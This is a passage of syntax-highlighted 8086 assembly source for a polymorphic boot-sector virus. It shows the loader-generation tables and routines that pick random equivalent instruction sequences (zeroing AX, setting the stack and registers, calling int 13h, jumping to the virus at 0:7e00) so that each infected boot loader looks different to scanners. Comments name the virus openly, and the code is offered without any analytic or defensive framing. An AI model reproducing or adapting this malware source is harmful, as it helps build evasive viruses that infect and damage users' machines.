                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">get_one</span><span class="sc0">         </span><span class="sc1">; this already done, redo</span><span class="sc0">

                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; * 2 for offset in mem</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; add to begin of the table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_data</span><span class="sc0">    </span><span class="sc1">; get addr of new and process it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">do_all_loop</span><span class="sc0">
</span><span class="sc5">end_do_all_c0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">get_timer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">orig_al</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; saved parameters from call</span><span class="sc0">
</span><span class="sc5">orig_ch</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">orig_cl</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">orig_dh</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">orig_dl</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; tables and constructs for the loader generation follows</span><span class="sc0">
</span><span class="sc5">loader_data</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; 7 stages to create in given order</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_jmp</span><span class="sc0">         </span><span class="sc1">; jmp over BPB</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin_init</span><span class="sc0">       </span><span class="sc1">; AX = 0 and CLI</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_stack</span><span class="sc0">        </span><span class="sc1">; SS:SP = 0:7c00</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_essti</span><span class="sc0">        </span><span class="sc1">; ES = 0 and STI</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_registers</span><span class="sc0">    </span><span class="sc1">; set AX,CX,DX to read virus</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">        </span><span class="sc1">; call to int 13h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">to_virus</span><span class="sc0">         </span><span class="sc1">; jump to virus (0:7e00)</span><span class="sc0">

</span><span class="sc5">init_jmp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">; 2 ways for the first jump</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_jmp_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_jmp_2</span><span class="sc0">

</span><span class="sc5">begin_init</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">0c0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; do both in rnd order</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_cli</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_ax</span><span class="sc0">

</span><span class="sc5">zero_ax</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">; select one of the 5 ways</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_ax_1</span><span class="sc0">        </span><span class="sc1">; to zero AX</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_ax_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_ax_3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_ax_4</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_ax_5</span><span class="sc0">

</span><span class="sc5">set_stack</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">0c0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; set stack in two passages</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_stack_1</span><span class="sc0">      </span><span class="sc1">; set SS</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_stack_2</span><span class="sc0">      </span><span class="sc1">; set SP</span><span class="sc0">

</span><span class="sc5">set_essti</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">0c0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_es</span><span class="sc0">           </span><span class="sc1">; set ES = 0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_sti</span><span class="sc0">          </span><span class="sc1">; STI</span><span class="sc0">

</span><span class="sc5">set_es</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_es_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_es_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_es_3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_es_4</span><span class="sc0">

</span><span class="sc5">set_sti</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sti_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sti_2</span><span class="sc0">

</span><span class="sc5">set_registers</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">0c0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_bx</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_cx</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_dx</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_ax</span><span class="sc0">

</span><span class="sc5">set_bx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_bx_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_bx_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_bx_3</span><span class="sc0">

</span><span class="sc5">set_cx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_cx_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_cx_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_cx_3</span><span class="sc0">

</span><span class="sc5">set_dx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_dx_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_dx_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_dx_3</span><span class="sc0">

</span><span class="sc5">set_ax</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_ax_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_ax_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">set_ax_3</span><span class="sc0">

</span><span class="sc5">do_int13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_int13h_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_int13h_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_int13h_3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_int13h_4</span><span class="sc0">

</span><span class="sc5">to_virus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">to_virus_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">to_virus_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">to_virus_3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">to_virus_4</span><span class="sc0">

</span><span class="sc5">init_jmp_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">         </span><span class="sc1">; jmp to virus loader</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; here is the BUG :-((</span><span class="sc0">
</span><span class="sc1">;               mov     al,90h          ; possible solution, but should change</span><span class="sc0">
                                        </span><span class="sc1">; in another way so the virus lenght</span><span class="sc0">
                                        </span><span class="sc1">; will be correct</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">init_jmp_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">         </span><span class="sc1">; jmp to virus loader</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_cli</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; 20h means just copy, 01 is the</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                     </span><span class="sc1">; lenght of the instruction</span><span class="sc0">

</span><span class="sc5">zero_ax_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">zero_ax_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">zero_ax_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">zero_ax_4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">zero_ax_5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">set_stack_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">set_stack_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">

</span><span class="sc5">set_es_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">set_es_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">set_es_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">set_es_4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">sti_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">sti_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">set_bx_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">

</span><span class="sc5">set_bx_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">set_bx_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc0">

</span><span class="sc5">set_cx_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc0">                 </span><span class="sc1">; mov cx,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_cl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_cx_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc0">                 </span><span class="sc1">; mov ch,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                 </span><span class="sc1">; mov cl,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_cl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_cx_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                 </span><span class="sc1">; mov cl,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_cl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
